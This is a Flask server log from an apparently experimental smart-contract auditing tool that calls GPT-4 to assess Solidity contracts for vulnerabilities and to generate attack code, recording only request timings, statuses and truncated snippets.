2025-06-02 18:07:37,283 - app.app - INFO - Application started
2025-06-02 18:07:37,286 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.18.0.4:8000
2025-06-02 18:07:37,287 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-02 18:07:39,489 - werkzeug - INFO - 172.18.0.1 - - [02/Jun/2025 18:07:39] "OPTIONS /history HTTP/1.1" 200 -
2025-06-02 18:07:39,505 - werkzeug - INFO - 172.18.0.1 - - [02/Jun/2025 18:07:39] "[31m[1mGET /history HTTP/1.1[0m" 401 -
2025-06-02 18:08:11,724 - werkzeug - INFO - 172.18.0.1 - - [02/Jun/2025 18:08:11] "OPTIONS /login HTTP/1.1" 200 -
2025-06-02 18:08:11,834 - werkzeug - INFO - 172.18.0.1 - - [02/Jun/2025 18:08:11] "POST /login HTTP/1.1" 200 -
2025-06-02 18:08:24,762 - werkzeug - INFO - 172.18.0.1 - - [02/Jun/2025 18:08:24] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-02 18:08:24,768 - app.api.contract - INFO - Received analyze request from wallet: 0x71C7656EC7ab88b098defB751B7401B5f6d8976F
2025-06-02 18:08:24,770 - app.api.contract - INFO - Analyzing code snippet
2025-06-02 18:08:24,775 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-02 18:08:24,795 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-02_18-08, status: ERROR
2025-06-02 18:08:24,796 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-02 18:08:24,797 - werkzeug - INFO - 172.18.0.1 - - [02/Jun/2025 18:08:24] "POST /analyze HTTP/1.1" 200 -
2025-06-02 18:25:53,860 - app.app - INFO - Application started
2025-06-02 18:25:53,863 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.18.0.4:8000
2025-06-02 18:25:53,863 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-02 18:29:44,472 - werkzeug - INFO - 172.18.0.1 - - [02/Jun/2025 18:29:44] "OPTIONS /login HTTP/1.1" 200 -
2025-06-02 18:29:44,594 - werkzeug - INFO - 172.18.0.1 - - [02/Jun/2025 18:29:44] "POST /login HTTP/1.1" 200 -
2025-06-02 18:29:51,796 - werkzeug - INFO - 172.18.0.1 - - [02/Jun/2025 18:29:51] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-02 18:29:51,804 - app.api.contract - INFO - Received analyze request from wallet: 0x71C7656EC7ab88b098defB751B7401B5f6d8976F
2025-06-02 18:29:51,806 - app.api.contract - INFO - Analyzing code snippet
2025-06-02 18:29:51,809 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-02 18:29:51,878 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-02 18:29:52,473 - solcx - INFO - Using solc version 0.8.0
2025-06-02 18:29:52,474 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-02 18:29:52,475 - solcx - INFO - Using solc version 0.8.0
2025-06-02 18:29:54,660 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-02 18:29:54,900 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-02 18:29:54,900 - app.modules.attack_generator - INFO - Contract name: SimpleStorage
2025-06-02 18:29:54,900 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-02 18:29:54,901 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-02 18:29:54,901 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-02 18:29:54,902 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-02 18:29:54,902 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-02 18:30:05,154 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-02 18:30:05,158 - app.modules.attack_generator - INFO - Received response from OpenAI API in 10.26 seconds
2025-06-02 18:30:05,160 - app.modules.attack_generator - INFO - Contract analysis completed in 10.26 seconds
2025-06-02 18:30:05,160 - app.modules.attack_generator - INFO - Vulnerability assessment: The contract does not have any explicit vulnerabilities such as reentrancy, logic bugs, permission i...
2025-06-02 18:30:05,160 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-02 18:30:05,161 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-02 18:30:05,161 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-02 18:30:05,162 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-02 18:30:10,144 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-02 18:30:10,151 - app.modules.attack_generator - INFO - Received response from OpenAI API in 4.99 seconds
2025-06-02 18:30:10,152 - app.modules.attack_generator - INFO - Attack code generation completed in 4.99 seconds
2025-06-02 18:30:10,152 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 437
2025-06-02 18:30:10,152 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 15.25 seconds
2025-06-02 18:30:10,153 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-02 18:30:10,174 - app.api.contract - INFO - Report saved with filename: SimpleStorage_2025-06-02_18-30, status: KO
2025-06-02 18:30:10,175 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-02 18:30:10,176 - werkzeug - INFO - 172.18.0.1 - - [02/Jun/2025 18:30:10] "POST /analyze HTTP/1.1" 200 -
2025-06-03 06:26:27,642 - app.app - INFO - Application started
2025-06-03 06:26:27,647 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.18.0.5:8000
2025-06-03 06:26:27,648 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-03 06:26:54,745 - werkzeug - INFO - 172.18.0.1 - - [03/Jun/2025 06:26:54] "OPTIONS /login HTTP/1.1" 200 -
2025-06-03 06:26:54,858 - werkzeug - INFO - 172.18.0.1 - - [03/Jun/2025 06:26:54] "POST /login HTTP/1.1" 200 -
2025-06-03 06:27:03,860 - werkzeug - INFO - 172.18.0.1 - - [03/Jun/2025 06:27:03] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-03 06:27:03,867 - app.api.contract - INFO - Received analyze request from wallet: 0x71C7656EC7ab88b098defB751B7401B5f6d8976F
2025-06-03 06:27:03,869 - app.api.contract - INFO - Analyzing code snippet
2025-06-03 06:27:03,872 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-03 06:27:03,878 - solcx - INFO - Using solc version 0.8.0
2025-06-03 06:27:05,871 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-03 06:27:06,074 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-03 06:27:06,074 - app.modules.attack_generator - INFO - Contract name: SimpleStorage
2025-06-03 06:27:06,075 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-03 06:27:06,075 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-03 06:27:06,076 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-03 06:27:06,076 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-03 06:27:06,077 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-03 06:27:16,248 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-03 06:27:16,252 - app.modules.attack_generator - INFO - Received response from OpenAI API in 10.18 seconds
2025-06-03 06:27:16,271 - app.modules.attack_generator - INFO - Contract analysis completed in 10.18 seconds
2025-06-03 06:27:16,271 - app.modules.attack_generator - INFO - Vulnerability assessment: The contract does not have any apparent security vulnerabilities. It does not contain any reentrancy...
2025-06-03 06:27:16,271 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-03 06:27:16,272 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-03 06:27:16,272 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-03 06:27:16,273 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-03 06:27:20,928 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-03 06:27:20,929 - app.modules.attack_generator - INFO - Received response from OpenAI API in 4.66 seconds
2025-06-03 06:27:20,930 - app.modules.attack_generator - INFO - Attack code generation completed in 4.66 seconds
2025-06-03 06:27:20,930 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 333
2025-06-03 06:27:20,931 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 14.83 seconds
2025-06-03 06:27:20,931 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-03 06:27:20,948 - app.api.contract - INFO - Report saved with filename: SimpleStorage_2025-06-03_06-27, status: KO
2025-06-03 06:27:20,949 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-03 06:27:20,950 - werkzeug - INFO - 172.18.0.1 - - [03/Jun/2025 06:27:20] "POST /analyze HTTP/1.1" 200 -
2025-06-18 14:24:46,039 - app.app - INFO - Application d√©marr√©e
2025-06-18 14:24:46,043 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.18.0.5:8000
2025-06-18 14:24:46,044 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-18 14:26:27,090 - app.app - INFO - Application d√©marr√©e
2025-06-18 14:26:27,092 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.20.0.5:8000
2025-06-18 14:26:27,093 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-18 14:28:03,272 - app.app - INFO - Application d√©marr√©e
2025-06-18 14:28:03,274 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.22.0.4:8000
2025-06-18 14:28:03,275 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-18 14:32:58,693 - werkzeug - INFO - 172.22.0.1 - - [18/Jun/2025 14:32:58] "OPTIONS /register HTTP/1.1" 200 -
2025-06-18 14:32:58,757 - werkzeug - INFO - 172.22.0.1 - - [18/Jun/2025 14:32:58] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-18 14:33:09,783 - werkzeug - INFO - 172.22.0.1 - - [18/Jun/2025 14:33:09] "OPTIONS /register HTTP/1.1" 200 -
2025-06-18 14:33:09,922 - werkzeug - INFO - 172.22.0.1 - - [18/Jun/2025 14:33:09] "POST /register HTTP/1.1" 200 -
2025-06-18 14:33:19,266 - werkzeug - INFO - 172.22.0.1 - - [18/Jun/2025 14:33:19] "OPTIONS /login HTTP/1.1" 200 -
2025-06-18 14:33:19,398 - werkzeug - INFO - 172.22.0.1 - - [18/Jun/2025 14:33:19] "POST /login HTTP/1.1" 200 -
2025-06-18 14:33:23,081 - werkzeug - INFO - 172.22.0.1 - - [18/Jun/2025 14:33:23] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-18 14:33:23,095 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-18 14:33:23,098 - app.api.contract - INFO - Analyzing code snippet
2025-06-18 14:33:23,105 - app.api.contract - INFO - Starting contract analysis for user: 2
2025-06-18 14:33:23,129 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-18_14-33, status: ERROR
2025-06-18 14:33:23,130 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-18 14:33:23,132 - werkzeug - INFO - 172.22.0.1 - - [18/Jun/2025 14:33:23] "POST /analyze HTTP/1.1" 200 -
2025-06-18 14:34:48,652 - werkzeug - INFO - 172.22.0.1 - - [18/Jun/2025 14:34:48] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-18 14:34:48,675 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-18 14:34:48,679 - app.api.contract - INFO - Analyzing code snippet
2025-06-18 14:34:48,693 - app.api.contract - INFO - Starting contract analysis for user: 2
2025-06-18 14:34:48,914 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-18 14:34:49,546 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-18_14-34, status: ERROR
2025-06-18 14:34:49,547 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-18 14:34:49,548 - werkzeug - INFO - 172.22.0.1 - - [18/Jun/2025 14:34:49] "POST /analyze HTTP/1.1" 200 -
2025-06-18 14:40:02,015 - werkzeug - INFO - 172.22.0.1 - - [18/Jun/2025 14:40:02] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-18 14:40:02,034 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-18 14:40:02,038 - app.api.contract - INFO - Analyzing code snippet
2025-06-18 14:40:02,047 - app.api.contract - INFO - Starting contract analysis for user: 2
2025-06-18 14:40:02,268 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-18 14:40:02,870 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-18_14-40, status: ERROR
2025-06-18 14:40:02,871 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-18 14:40:02,872 - werkzeug - INFO - 172.22.0.1 - - [18/Jun/2025 14:40:02] "POST /analyze HTTP/1.1" 200 -
2025-06-18 14:40:50,237 - app.app - INFO - Application d√©marr√©e
2025-06-18 14:40:50,239 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.24.0.5:8000
2025-06-18 14:40:50,240 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-18 14:41:00,211 - werkzeug - INFO - 172.24.0.1 - - [18/Jun/2025 14:41:00] "OPTIONS /login HTTP/1.1" 200 -
2025-06-18 14:41:00,310 - werkzeug - INFO - 172.24.0.1 - - [18/Jun/2025 14:41:00] "POST /login HTTP/1.1" 200 -
2025-06-18 14:41:05,918 - werkzeug - INFO - 172.24.0.1 - - [18/Jun/2025 14:41:05] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-18 14:41:05,937 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-18 14:41:05,942 - app.api.contract - INFO - Analyzing code snippet
2025-06-18 14:41:05,947 - app.api.contract - INFO - Starting contract analysis for user: 2
2025-06-18 14:41:06,126 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-18 14:41:06,719 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-18_14-41, status: ERROR
2025-06-18 14:41:06,720 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-18 14:41:06,721 - werkzeug - INFO - 172.24.0.1 - - [18/Jun/2025 14:41:06] "POST /analyze HTTP/1.1" 200 -
2025-06-18 14:41:34,198 - werkzeug - INFO - 172.24.0.1 - - [18/Jun/2025 14:41:34] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-18 14:41:34,233 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-18 14:41:34,237 - app.api.contract - INFO - Analyzing code snippet
2025-06-18 14:41:34,246 - app.api.contract - INFO - Starting contract analysis for user: 2
2025-06-18 14:41:34,449 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-18 14:41:35,325 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-18_14-41, status: ERROR
2025-06-18 14:41:35,326 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-18 14:41:35,328 - werkzeug - INFO - 172.24.0.1 - - [18/Jun/2025 14:41:35] "POST /analyze HTTP/1.1" 200 -
2025-06-18 14:41:39,862 - werkzeug - INFO - 172.24.0.1 - - [18/Jun/2025 14:41:39] "OPTIONS /history HTTP/1.1" 200 -
2025-06-18 14:41:39,886 - werkzeug - INFO - 172.24.0.1 - - [18/Jun/2025 14:41:39] "GET /history HTTP/1.1" 200 -
2025-06-18 14:43:38,897 - werkzeug - INFO - 172.24.0.1 - - [18/Jun/2025 14:43:38] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-18 14:43:38,954 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-18 14:43:38,959 - app.api.contract - INFO - Analyzing code snippet
2025-06-18 14:43:38,986 - app.api.contract - INFO - Starting contract analysis for user: 2
2025-06-18 14:43:39,145 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-18 14:43:39,578 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-18_14-43, status: ERROR
2025-06-18 14:43:39,579 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-18 14:43:39,581 - werkzeug - INFO - 172.24.0.1 - - [18/Jun/2025 14:43:39] "POST /analyze HTTP/1.1" 200 -
2025-06-18 14:47:09,608 - app.app - INFO - Application d√©marr√©e
2025-06-18 14:47:09,622 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.27.0.5:8000
2025-06-18 14:47:09,623 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-18 14:47:11,904 - werkzeug - INFO - 172.27.0.1 - - [18/Jun/2025 14:47:11] "OPTIONS /login HTTP/1.1" 200 -
2025-06-18 14:47:12,425 - werkzeug - INFO - 172.27.0.1 - - [18/Jun/2025 14:47:12] "POST /login HTTP/1.1" 200 -
2025-06-18 14:47:27,928 - werkzeug - INFO - 172.27.0.1 - - [18/Jun/2025 14:47:27] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-18 14:47:27,961 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-18 14:47:27,991 - app.api.contract - INFO - Analyzing code snippet
2025-06-18 14:47:28,008 - app.api.contract - INFO - Starting contract analysis for user: 2
2025-06-18 14:47:28,274 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-18 14:47:29,246 - solcx - INFO - Using solc version 0.8.0
2025-06-18 14:47:29,248 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-18 14:47:29,252 - solcx - INFO - Using solc version 0.8.0
2025-06-18 14:47:33,701 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-18 14:47:33,873 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-18_14-47, status: ERROR
2025-06-18 14:47:33,876 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-18 14:47:33,879 - werkzeug - INFO - 172.27.0.1 - - [18/Jun/2025 14:47:33] "POST /analyze HTTP/1.1" 200 -
2025-06-18 14:47:50,912 - werkzeug - INFO - 172.27.0.1 - - [18/Jun/2025 14:47:50] "OPTIONS /history HTTP/1.1" 200 -
2025-06-18 14:47:50,956 - werkzeug - INFO - 172.27.0.1 - - [18/Jun/2025 14:47:50] "GET /history HTTP/1.1" 200 -
2025-06-18 14:55:11,160 - werkzeug - INFO - 172.27.0.1 - - [18/Jun/2025 14:55:11] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-18 14:55:11,190 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-18 14:55:11,202 - app.api.contract - INFO - Analyzing code snippet
2025-06-18 14:55:11,230 - app.api.contract - INFO - Starting contract analysis for user: 2
2025-06-18 14:55:11,250 - solcx - INFO - Using solc version 0.8.0
2025-06-18 14:55:13,827 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-18 14:55:13,829 - app.modules.attack_generator - INFO - Contract name: VulnerableBank
2025-06-18 14:55:13,831 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-18 14:55:13,833 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-18 14:55:13,836 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-18 14:55:13,838 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-18 14:55:13,839 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-18 14:55:29,202 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-18 14:55:29,231 - app.modules.attack_generator - INFO - ‚úÖ OPENAI API CALL SUCCESSFUL - Request ID: chatcmpl-BjoTycpESLvJNDAAuu9HkewfcNpe4
2025-06-18 14:55:29,237 - app.modules.attack_generator - INFO - Received response from OpenAI API in 15.39 seconds
2025-06-18 14:55:29,240 - app.modules.attack_generator - INFO - Response first 50 chars: '1. Contract Analysis:
The contract is a simple ban...'
2025-06-18 14:55:29,260 - app.modules.attack_generator - INFO - Contract analysis completed in 15.39 seconds
2025-06-18 14:55:29,267 - app.modules.attack_generator - INFO - Vulnerability assessment: The contract is vulnerable to a reentrancy attack. This is because in the withdraw function, the con...
2025-06-18 14:55:29,271 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-18 14:55:29,274 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-18 14:55:29,278 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-18 14:55:29,280 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-18 14:55:37,185 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-18 14:55:37,212 - app.modules.attack_generator - INFO - ‚úÖ OPENAI API CALL SUCCESSFUL - Request ID: chatcmpl-BjoUE62TogAfoyLQ4P4ljB7WNMUd8
2025-06-18 14:55:37,216 - app.modules.attack_generator - INFO - Received response from OpenAI API in 7.93 seconds
2025-06-18 14:55:37,221 - app.modules.attack_generator - INFO - Response first 50 chars: ';

interface IBank {
    function deposit() extern...'
2025-06-18 14:55:37,236 - app.modules.attack_generator - INFO - Attack code generation completed in 7.93 seconds
2025-06-18 14:55:37,239 - app.modules.attack_generator - INFO - No attack code was generated
2025-06-18 14:55:37,242 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 23.33 seconds
2025-06-18 14:55:37,244 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-18 14:55:37,264 - app.api.contract - INFO - Report saved with filename: VulnerableBank_2025-06-18_14-55, status: OK
2025-06-18 14:55:37,266 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-18 14:55:37,269 - werkzeug - INFO - 172.27.0.1 - - [18/Jun/2025 14:55:37] "POST /analyze HTTP/1.1" 200 -
2025-06-18 15:11:19,589 - app.app - INFO - Application d√©marr√©e
2025-06-18 15:11:19,601 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.29.0.5:8000
2025-06-18 15:11:19,603 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-18 15:11:50,491 - werkzeug - INFO - 172.29.0.1 - - [18/Jun/2025 15:11:50] "OPTIONS /history HTTP/1.1" 200 -
2025-06-18 15:11:50,572 - werkzeug - INFO - 172.29.0.1 - - [18/Jun/2025 15:11:50] "[35m[1mGET /history HTTP/1.1[0m" 500 -
2025-06-18 15:11:59,178 - werkzeug - INFO - 172.29.0.1 - - [18/Jun/2025 15:11:59] "OPTIONS /login HTTP/1.1" 200 -
2025-06-18 15:11:59,219 - werkzeug - INFO - 172.29.0.1 - - [18/Jun/2025 15:11:59] "[35m[1mPOST /login HTTP/1.1[0m" 500 -
2025-06-18 15:12:14,273 - werkzeug - INFO - 172.29.0.1 - - [18/Jun/2025 15:12:14] "OPTIONS /register HTTP/1.1" 200 -
2025-06-18 15:12:14,297 - werkzeug - INFO - 172.29.0.1 - - [18/Jun/2025 15:12:14] "[35m[1mPOST /register HTTP/1.1[0m" 500 -
2025-06-18 15:48:12,083 - app.app - INFO - Application d√©marr√©e
2025-06-18 15:48:12,096 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.29.0.5:8000
2025-06-18 15:48:12,097 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-18 15:49:15,231 - app.app - INFO - Application d√©marr√©e
2025-06-18 15:49:15,243 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.29.0.5:8000
2025-06-18 15:49:15,244 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-18 15:59:34,787 - werkzeug - INFO - 172.29.0.1 - - [18/Jun/2025 15:59:34] "GET /expertise-questions HTTP/1.1" 200 -
2025-06-18 16:11:43,737 - app.app - INFO - Application d√©marr√©e
2025-06-18 16:11:43,751 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.16.5:8000
2025-06-18 16:11:43,753 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-18 16:16:54,767 - werkzeug - INFO - 192.168.16.1 - - [18/Jun/2025 16:16:54] "OPTIONS /login HTTP/1.1" 200 -
2025-06-18 16:16:54,846 - werkzeug - INFO - 192.168.16.1 - - [18/Jun/2025 16:16:54] "[35m[1mPOST /login HTTP/1.1[0m" 500 -
2025-06-18 17:02:15,274 - app.app - INFO - Application started
2025-06-18 17:02:15,276 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.19.0.5:8000
2025-06-18 17:02:15,277 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-18 17:04:06,289 - app.app - INFO - Application started
2025-06-18 17:04:06,291 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.20.0.5:8000
2025-06-18 17:04:06,293 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 12:22:34,508 - werkzeug - INFO - 172.20.0.1 - - [19/Jun/2025 12:22:34] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 12:22:34,556 - werkzeug - INFO - 172.20.0.1 - - [19/Jun/2025 12:22:34] "[31m[1mPOST /login HTTP/1.1[0m" 401 -
2025-06-19 12:22:42,685 - werkzeug - INFO - 172.20.0.1 - - [19/Jun/2025 12:22:42] "OPTIONS /register HTTP/1.1" 200 -
2025-06-19 12:22:42,842 - werkzeug - INFO - 172.20.0.1 - - [19/Jun/2025 12:22:42] "POST /register HTTP/1.1" 200 -
2025-06-19 12:22:49,078 - werkzeug - INFO - 172.20.0.1 - - [19/Jun/2025 12:22:49] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 12:22:49,202 - werkzeug - INFO - 172.20.0.1 - - [19/Jun/2025 12:22:49] "POST /login HTTP/1.1" 200 -
2025-06-19 12:23:30,090 - werkzeug - INFO - 172.20.0.1 - - [19/Jun/2025 12:23:30] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 12:23:30,103 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 12:23:30,106 - app.api.contract - INFO - Analyzing code snippet
